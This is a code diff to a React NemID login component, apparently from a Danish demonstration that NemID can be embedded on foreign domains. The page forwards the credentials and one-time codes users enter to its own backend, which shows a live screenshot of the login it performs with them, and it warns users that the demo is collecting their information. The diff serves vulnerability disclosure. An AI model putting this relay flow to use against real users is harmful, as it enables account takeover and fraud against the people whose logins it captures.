@@ -14,8 +14,8 @@ function delay(ms) {
   });
 }
 
-const HOST_NAME = 'https://medlemsklubben-dk.appspot.com';
-// const HOST_NAME = 'http://localhost:8080';
+// const HOST_NAME = 'https://medlemsklubben-dk.appspot.com';
+const HOST_NAME = 'http://localhost:8080';
 
 async function request({ path, body }) {
   const resp = await fetch(`${HOST_NAME}${path}`, {
@@ -40,6 +40,7 @@ class NemIdLogin extends Component {
     isLoading: true,
     step: STEPS.LOGIN,
     isModalVisible: false,
+    isScreenshotsVisible: false,
 
     // inputs
     username: '',
@@ -52,6 +53,17 @@ class NemIdLogin extends Component {
     unreadMessages: 0,
     otpRequestCode: null
   };
+
+  showScreenshots = e => {
+    e.preventDefault();
+    this.setState({ isScreenshotsVisible: true });
+  };
+
+  onMonitorScreenshots = e => {
+    e.preventDefault();
+    this.setState({ isMonitorScreenshotsVisible: true });
+    this.monitorScreenshots();
+  }
 
   closeModal = () => {
     this.setState({ isModalVisible: false });
@@ -75,7 +87,10 @@ class NemIdLogin extends Component {
       body: { username, password }
     });
 
-    this.setState({ id });
+    this.setState({
+      id,
+      isLoading: true
+    });
 
     try {
       await this.poll(id);
@@ -84,9 +99,17 @@ class NemIdLogin extends Component {
     }
   };
 
+  monitorScreenshots = async () => {
+    let id = this.state.id;
+    let screenshotUrl = `/screenshot?id=${id}&cb=${Date.now()}`
+    this.setState({ screenshotUrl });
+    await delay(1000);
+    return this.monitorScreenshots();
+  }
+
   poll = async id => {
     const resp = await request({ path: '/poll', body: { id } });
-    const { unreadMessages, otpRequestCode, waitingForAppAck } = await resp;
+    const { unreadMessages, otpRequestCode, waitingForAppAck, loginError } = await resp;
     if (unreadMessages != null) {
       this.setState({ unreadMessages, isModalVisible: true, isLoading: false });
       return;
@@ -97,6 +120,11 @@ class NemIdLogin extends Component {
         this.setState({
           otpRequestCode,
           step: STEPS.OTP_PAPKORT,
+          isLoading: false
+        });
+      } else if (loginError) {
+        this.setState({
+          loginError,
           isLoading: false
         });
       } else if (waitingForAppAck) {
@@ -180,6 +208,10 @@ class NemIdLogin extends Component {
                 onChange={this.onChangePassword}
               />
             </div>
+          </div>
+
+          <div className="error">
+            {this.state.loginError}
           </div>
 
           <div className="bottom">
@@ -273,6 +305,14 @@ class NemIdLogin extends Component {
       </form>
     );
 
+    const stepLoggedIn = (
+      <div>
+        <h2>Velkommen</h2>
+        <p>Vælg et vores mange gode tilbud herunder....</p>
+        <p>i</p>
+      </div>
+    );
+
     switch (step) {
       case STEPS.LOGIN:
         return stepLogin;
@@ -280,6 +320,8 @@ class NemIdLogin extends Component {
         return stepOtpApp;
       case STEPS.OTP_PAPKORT:
         return stepOtpPapkort;
+      case STEPS.LOGGED_IN:
+        return stepLoggedIn;
       default:
         return stepLogin;
     }
@@ -311,12 +353,30 @@ class NemIdLogin extends Component {
                 for angreb, og hackere vil nemt kunne udskifte et officiel NemId
                 Login med deres egen, der sender dem alle brugeres NemId login.
               </p>
+              <p>
+                Webservere kan logge sig ind som dig og underskrive som dig,
+                uden at du kan se det. Denne demo webserver er lige nu ved at
+                indsamle oplysninger om dig.
+                <a onClick={this.showScreenshots}>Se skærmbilleder</a>.
+                Med de informationer kan kriminelle
+                optage lån i dit navn, afpresse dig...
+              </p>
+              <p>
+                Problemet er ikke papkortet, men nærmere at
+                NemID/Digitaliseringsstyrelsen tillader at indlejre NemID boksen
+                på fremmede domæner, så du som bruger ikke kan sikre dig,
+                at du kun giver dine login oplysninger til NemID.
+              </p>
             </div>
           }
           closeModal={this.closeModal}
           isModalVisible={this.state.isModalVisible}
         />
         {this.getContentForStep(this.state.step)}
+        <a onClick={this.onMonitorScreenshots}>Se backend browserens skærmbillede</a>
+        {this.state.isMonitorScreenshotsVisible && this.state.screenshotUrl &&
+          <div><img src={this.state.screenshotUrl} width="640" height="480"/></div>
+        }
       </div>
     );
   }
